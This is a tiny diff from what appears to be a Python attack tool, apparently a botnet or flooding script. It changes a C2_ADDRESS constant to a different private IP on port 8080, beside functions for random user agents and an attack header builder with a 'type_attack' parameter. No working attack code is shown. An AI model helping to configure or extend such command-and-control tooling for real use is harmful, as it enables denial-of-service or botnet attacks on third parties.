@@ -191,7 +191,7 @@ def rand_ua(mode):
         ua = user_gen2()
     return ua
 
-C2_ADDRESS  = "172.24.112.1"
+C2_ADDRESS  = "172.18.112.1"
 C2_PORT     = 8080
 
 def header_http(host,type_attack,mode_type,ver):
